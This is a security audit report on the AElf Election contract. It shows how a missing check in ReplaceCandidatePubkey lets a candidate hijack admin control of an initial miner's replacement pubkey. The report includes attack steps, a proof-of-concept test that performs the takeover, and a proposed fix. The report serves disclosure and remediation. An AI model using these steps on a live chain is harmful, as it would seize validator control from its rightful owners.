# Audit Report

## Title
Privilege Escalation via Replacement Chain Break When Reusing Initial Miner Replacement Pubkeys

## Summary
The Election contract's `PerformReplacement` function unconditionally overwrites critical state mappings without validating whether a pubkey has already been used as a replacement target. This allows any candidate to hijack admin control over replacement pubkeys created when initial miners rotate their keys, enabling unauthorized privilege escalation and permanent loss of legitimate control.

## Finding Description

The vulnerability stems from a critical validation gap in the `ReplaceCandidatePubkey` function combined with unconditional state overwrites in `PerformReplacement`.

**Root Cause Analysis:**

1. **Initial State Separation**: During contract initialization, initial miners are added to `InitialMiners` but explicitly NOT added to the `Candidates` list. [1](#0-0) 

2. **Conditional List Updates**: When replacing a pubkey, the new pubkey is only added to `Candidates` if the old pubkey was already in `Candidates`. [2](#0-1)  Similarly, the new pubkey is only added to `InitialMiners` if the old pubkey was in `InitialMiners`. [3](#0-2) 

3. **Insufficient Validation**: The validation only checks if the new pubkey is in the `Candidates` list (not `InitialMiners`) and whether both pubkeys are unbanned. [4](#0-3) [5](#0-4) 

4. **Unconditional Overwrites**: The `PerformReplacement` function unconditionally overwrites `CandidateReplacementMap` and `InitialPubkeyMap` without checking if the new pubkey has been previously used. [6](#0-5) 

**Attack Execution:**

**Step 1**: When initial miner A (controlled by AdminA) replaces their key with B:
- B is added to `InitialMiners` but NOT to `Candidates` (A was not in `Candidates`)
- Only A is banned via `State.BannedPubkeyMap[input.OldPubkey] = true` [7](#0-6) 
- `InitialPubkeyMap[B] = A` is set

**Step 2**: Attacker controlling candidate X (with admin AdminX) calls `ReplaceCandidatePubkey(X, B)`:
- Validation passes because B is NOT in `Candidates` (only in `InitialMiners`)
- B is NOT banned (only A was banned)
- `PerformReplacement(X, B)` overwrites: `CandidateReplacementMap[B] = X` and `InitialPubkeyMap[B] = X`

**Step 3**: Admin resolution is corrupted. The `GetCandidateAdmin` function resolves admin by looking up the initial pubkey: [8](#0-7) 

After the attack, `GetCandidateAdmin(B)` returns `CandidateAdmins[X]` (AdminX) instead of `CandidateAdmins[A]` (AdminA).

## Impact Explanation

**Severity: HIGH - Authorization Bypass & Privilege Escalation**

1. **Permanent Loss of Legitimate Control**: The original admin (AdminA) can no longer control pubkey B. All admin-restricted operations now resolve to the attacker's admin address.

2. **Unauthorized Admin Powers**: The attacker (AdminX) gains ability to:
   - Call `SetCandidateAdmin` to permanently transfer B's admin to another address [9](#0-8) 
   - Call `ReplaceCandidatePubkey` to replace B with another pubkey under attacker control
   - Call `QuitElection` to remove B from consensus participation [10](#0-9) 

3. **Replacement Chain Corruption**: The historical mapping that B replaced A is permanently lost, breaking the audit trail that tracks pubkey replacement chains. [11](#0-10) 

4. **Consensus Integrity Risk**: If B is an active validator/miner, the wrong party gains control over consensus participation, potentially enabling malicious validator behavior or censorship.

This violates the security invariant that admin control must remain with the rightful owner throughout the entire replacement chain.

## Likelihood Explanation

**Assessment: MEDIUM-HIGH**

**Attacker Prerequisites:**
- Control a candidate (requires 100,000 ELF stake via `AnnounceElection`) [12](#0-11) 
- Identify an initial miner that has performed key rotation (publicly observable via `CandidatePubkeyReplaced` events)
- No special permissions beyond candidate admin rights

**Attack Complexity: LOW**
- Single transaction execution
- No timing dependencies
- Publicly queryable state (Candidates and InitialMiners lists)

**Trigger Conditions:**
- Initial miner key rotation is legitimate operational security practice
- Vulnerability window opens immediately upon initial miner replacement
- Window persists indefinitely (initial miner replacement pubkeys cannot call `AnnounceElection` per validation at line 149) [13](#0-12) 

**Economic Analysis:**
- Cost: 100,000 ELF candidate stake (recoverable via `QuitElection` if not exploited)
- Benefit: Control over initial miner validator operations and associated privileges
- High probability of occurrence given that initial miner key rotation is expected operational behavior

## Recommendation

Add validation in `ReplaceCandidatePubkey` to check if the new pubkey exists in ANY replacement-related state (not just `Candidates`):

```csharp
// After line 191 in ElectionContract_Maintainence.cs
Assert(!candidates.Value.Contains(newPubkeyBytes), "New pubkey is already a candidate.");

// Add these checks:
var newPubkeyHex = input.NewPubkey;
Assert(State.CandidateReplacementMap[newPubkeyHex] == null, 
    "New pubkey has already been used as a replacement target.");
Assert(State.InitialPubkeyMap[newPubkeyHex] == null, 
    "New pubkey has already been used in replacement chain.");
Assert(!State.InitialMiners.Value.Value.Contains(newPubkeyBytes), 
    "New pubkey is already an initial miner.");
```

This prevents reuse of any pubkey that has participated in any replacement chain, maintaining the integrity of the admin resolution mechanism.

## Proof of Concept

```csharp
[Fact]
public async Task ReplaceCandidatePubkey_InitialMinerReplacement_PrivilegeEscalation()
{
    // Setup: Initial miner A with AdminA
    var initialMinerA = InitialCoreDataCenterKeyPairs[0];
    var adminA = ValidationDataCenterKeyPairs[0];
    var adminAAddress = Address.FromPublicKey(adminA.PublicKey);
    
    var adminAStub = GetTester<ElectionContractImplContainer.ElectionContractImplStub>(
        ElectionContractAddress, adminA);
    await adminAStub.SetCandidateAdmin.SendAsync(new SetCandidateAdminInput
    {
        Pubkey = initialMinerA.PublicKey.ToHex(),
        Admin = adminAAddress
    });
    
    // Step 1: AdminA replaces initial miner A with B
    var pubkeyB = ValidationDataCenterKeyPairs[1];
    await adminAStub.ReplaceCandidatePubkey.SendAsync(new ReplaceCandidatePubkeyInput
    {
        OldPubkey = initialMinerA.PublicKey.ToHex(),
        NewPubkey = pubkeyB.PublicKey.ToHex()
    });
    
    // Verify B's admin is AdminA
    var adminBeforeAttack = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = pubkeyB.PublicKey.ToHex() });
    adminBeforeAttack.ShouldBe(adminAAddress);
    
    // Setup attacker: Candidate X with AdminX
    var candidateX = ValidationDataCenterKeyPairs[2];
    var adminX = ValidationDataCenterKeyPairs[3];
    var adminXAddress = Address.FromPublicKey(adminX.PublicKey);
    await AnnounceElectionAsync(candidateX, adminXAddress);
    
    // Step 2: AdminX (attacker) replaces candidate X with B (ATTACK)
    var adminXStub = GetTester<ElectionContractImplContainer.ElectionContractImplStub>(
        ElectionContractAddress, adminX);
    var attackResult = await adminXStub.ReplaceCandidatePubkey.SendAsync(
        new ReplaceCandidatePubkeyInput
        {
            OldPubkey = candidateX.PublicKey.ToHex(),
            NewPubkey = pubkeyB.PublicKey.ToHex()
        });
    
    // Attack succeeds (should fail but doesn't due to vulnerability)
    attackResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 3: Verify privilege escalation - B's admin is now AdminX
    var adminAfterAttack = await ElectionContractStub.GetCandidateAdmin.CallAsync(
        new StringValue { Value = pubkeyB.PublicKey.ToHex() });
    adminAfterAttack.ShouldBe(adminXAddress); // AdminA lost control!
    
    // Demonstrate unauthorized control: AdminX can now SetCandidateAdmin for B
    await adminXStub.SetCandidateAdmin.SendAsync(new SetCandidateAdminInput
    {
        Pubkey = pubkeyB.PublicKey.ToHex(),
        Admin = adminXAddress // AdminX solidifies control
    });
    
    // AdminA can no longer control B
    var adminAAttempt = await adminAStub.SetCandidateAdmin.SendWithExceptionAsync(
        new SetCandidateAdminInput
        {
            Pubkey = pubkeyB.PublicKey.ToHex(),
            Admin = adminAAddress
        });
    adminAAttempt.TransactionResult.Error.ShouldContain("No permission.");
}
```

## Notes

This vulnerability exploits the semantic difference between `Candidates` and `InitialMiners` lists. The validation assumes checking `Candidates` is sufficient, but initial miner replacement pubkeys reside in `InitialMiners` without being in `Candidates`. This creates an exploitable gap where pubkeys can be reused as replacement targets, breaking the one-way integrity of the replacement chain and enabling admin control hijacking.

The attack is particularly dangerous because:
1. It requires no compromise of trusted roles
2. Initial miner key rotation is legitimate and expected behavior
3. The vulnerability persists indefinitely once an initial miner performs key rotation
4. The attacker gains control over consensus-critical infrastructure

### Citations

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L26-43)
```csharp
        State.Candidates.Value = new PubkeyList();

        State.MinimumLockTime.Value = input.MinimumLockTime;
        State.MaximumLockTime.Value = input.MaximumLockTime;

        State.TimeEachTerm.Value = input.TimeEachTerm;

        State.MinersCount.Value = input.MinerList.Count;
        State.InitialMiners.Value = new PubkeyList
        {
            // ReSharper disable once ConvertClosureToMethodGroup
            Value = { input.MinerList.Select(m => ByteStringHelper.FromHexString(m)) }
        };
        foreach (var pubkey in input.MinerList)
            State.CandidateInformationMap[pubkey] = new CandidateInformation
            {
                Pubkey = pubkey
            };
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L177-178)
```csharp
        Assert(!IsPubkeyBanned(input.OldPubkey) && !IsPubkeyBanned(input.NewPubkey),
            "Pubkey is in already banned.");
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L191-191)
```csharp
        Assert(!candidates.Value.Contains(newPubkeyBytes), "New pubkey is already a candidate.");
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L192-197)
```csharp
        if (candidates.Value.Contains(oldPubkeyBytes))
        {
            candidates.Value.Remove(oldPubkeyBytes);
            candidates.Value.Add(newPubkeyBytes);
            State.Candidates.Value = candidates;
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L220-226)
```csharp
        var initialMiners = State.InitialMiners.Value;
        if (initialMiners.Value.Contains(oldPubkeyBytes))
        {
            initialMiners.Value.Remove(oldPubkeyBytes);
            initialMiners.Value.Add(newPubkeyBytes);
            State.InitialMiners.Value = initialMiners;
        }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L246-246)
```csharp
        State.BannedPubkeyMap[input.OldPubkey] = true;
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Maintainence.cs (L280-291)
```csharp
    private void PerformReplacement(string oldPubkey, string newPubkey)
    {
        State.CandidateReplacementMap[newPubkey] = oldPubkey;

        // Initial pubkey is:
        // - miner pubkey of the first round (aka. Initial Miner), or
        // - the pubkey announced election

        var initialPubkey = State.InitialPubkeyMap[oldPubkey] ?? oldPubkey;
        State.InitialPubkeyMap[newPubkey] = initialPubkey;

        State.InitialToNewestPubkeyMap[initialPubkey] = newPubkey;
```

**File:** contract/AElf.Contracts.Election/ViewMethods.cs (L411-414)
```csharp
    public override Address GetCandidateAdmin(StringValue input)
    {
        return State.CandidateAdmins[State.InitialPubkeyMap[input.Value] ?? input.Value];
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L19-57)
```csharp
    public override Empty SetCandidateAdmin(SetCandidateAdminInput input)
    {
        Assert(IsCurrentCandidateOrInitialMiner(input.Pubkey),
            "Pubkey is neither a current candidate nor an initial miner.");
        Assert(!IsPubkeyBanned(input.Pubkey), "Pubkey is already banned.");

        // Permission check
        var pubkey = State.InitialPubkeyMap[input.Pubkey] ?? input.Pubkey;
        if (Context.Sender != GetParliamentDefaultAddress())
        {
            if (State.CandidateAdmins[pubkey] == null)
            {
                // If admin is not set before (due to old contract code)
                Assert(Context.Sender == Address.FromPublicKey(ByteArrayHelper.HexStringToByteArray(input.Pubkey)),
                    "No permission.");
            }
            else
            {
                var oldCandidateAdmin = State.CandidateAdmins[pubkey];
                Assert(Context.Sender == oldCandidateAdmin, "No permission.");
            }
        }

        State.CandidateAdmins[pubkey] = input.Admin;

        var pubkeyByteString = ByteString.CopyFrom(ByteArrayHelper.HexStringToByteArray(pubkey));

        var newAdminManagedPubkeys = State.ManagedCandidatePubkeysMap[input.Admin] ?? new PubkeyList();
        if (!newAdminManagedPubkeys.Value.Contains(pubkeyByteString))
            newAdminManagedPubkeys.Value.Add(pubkeyByteString);
        State.ManagedCandidatePubkeysMap[input.Admin] = newAdminManagedPubkeys;

        var oldAdminManagedPubkeys = State.ManagedCandidatePubkeysMap[Context.Sender] ?? new PubkeyList();
        if (oldAdminManagedPubkeys.Value.Contains(pubkeyByteString))
            oldAdminManagedPubkeys.Value.Remove(pubkeyByteString);
        State.ManagedCandidatePubkeysMap[Context.Sender] = oldAdminManagedPubkeys;

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L144-175)
```csharp
    private void AnnounceElection(byte[] pubkeyBytes)
    {
        var pubkey = pubkeyBytes.ToHex();
        var pubkeyByteString = ByteString.CopyFrom(pubkeyBytes);

        Assert(!State.InitialMiners.Value.Value.Contains(pubkeyByteString),
            "Initial miner cannot announce election.");

        var candidateInformation = State.CandidateInformationMap[pubkey];

        if (candidateInformation != null)
        {
            Assert(!candidateInformation.IsCurrentCandidate,
                $"This public key already announced election. {pubkey}");
            candidateInformation.AnnouncementTransactionId = Context.OriginTransactionId;
            candidateInformation.IsCurrentCandidate = true;
            // In this way we can keep history of current candidate, like terms, missed time slots, etc.
            State.CandidateInformationMap[pubkey] = candidateInformation;
        }
        else
        {
            Assert(!IsPubkeyBanned(pubkey), "This candidate already banned before.");
            State.CandidateInformationMap[pubkey] = new CandidateInformation
            {
                Pubkey = pubkey,
                AnnouncementTransactionId = Context.OriginTransactionId,
                IsCurrentCandidate = true
            };
        }

        State.Candidates.Value.Value.Add(pubkeyByteString);
    }
```

**File:** contract/AElf.Contracts.Election/ElectionContract_Candidate.cs (L229-279)
```csharp
    public override Empty QuitElection(StringValue input)
    {
        var pubkeyBytes = ByteArrayHelper.HexStringToByteArray(input.Value);
        QuitElection(pubkeyBytes);
        var pubkey = input.Value;

        var initialPubkey = State.InitialPubkeyMap[pubkey] ?? pubkey;
        Assert(Context.Sender == State.CandidateAdmins[initialPubkey], "Only admin can quit election.");
        var candidateInformation = State.CandidateInformationMap[pubkey];

        // Unlock candidate's native token.
        var lockId = candidateInformation.AnnouncementTransactionId;
        var lockVirtualAddress = Context.ConvertVirtualAddressToContractAddress(lockId);
        State.TokenContract.TransferFrom.Send(new TransferFromInput
        {
            From = lockVirtualAddress,
            To = State.CandidateSponsorMap[input.Value] ?? Address.FromPublicKey(pubkeyBytes),
            Symbol = Context.Variables.NativeSymbol,
            Amount = ElectionContractConstants.LockTokenForElection,
            Memo = "Quit election."
        });

        // Update candidate information.
        candidateInformation.IsCurrentCandidate = false;
        candidateInformation.AnnouncementTransactionId = Hash.Empty;
        State.CandidateInformationMap[pubkey] = candidateInformation;

        // Remove candidate public key from the Voting Item options.
        State.VoteContract.RemoveOption.Send(new RemoveOptionInput
        {
            VotingItemId = State.MinerElectionVotingItemId.Value,
            Option = pubkey
        });
        var dataCenterList = State.DataCentersRankingList.Value;
        if (dataCenterList.DataCenters.ContainsKey(pubkey))
        {
            dataCenterList.DataCenters[pubkey] = 0;
            UpdateDataCenterAfterMemberVoteAmountChanged(dataCenterList, pubkey, true);
            State.DataCentersRankingList.Value = dataCenterList;
        }

        var managedCandidatePubkey = State.ManagedCandidatePubkeysMap[Context.Sender];
        managedCandidatePubkey.Value.Remove(ByteString.CopyFrom(pubkeyBytes));
        if (managedCandidatePubkey.Value.Any())
            State.ManagedCandidatePubkeysMap[Context.Sender] = managedCandidatePubkey;
        else
            State.ManagedCandidatePubkeysMap.Remove(Context.Sender);

        State.CandidateSponsorMap.Remove(pubkey);

        return new Empty();
```

**File:** contract/AElf.Contracts.Election/ElectionContractState.cs (L75-88)
```csharp
    /// <summary>
    ///     Pubkey -> Newest pubkey
    /// </summary>
    public MappedState<string, string> CandidateReplacementMap { get; set; }

    /// <summary>
    ///     Pubkey -> Initial pubkey (First round initial miner pubkey or first announce election pubkey)
    /// </summary>
    public MappedState<string, string> InitialPubkeyMap { get; set; }

    /// <summary>
    ///     Initial pubkey -> Newest pubkey
    /// </summary>
    public MappedState<string, string> InitialToNewestPubkeyMap { get; set; }
```
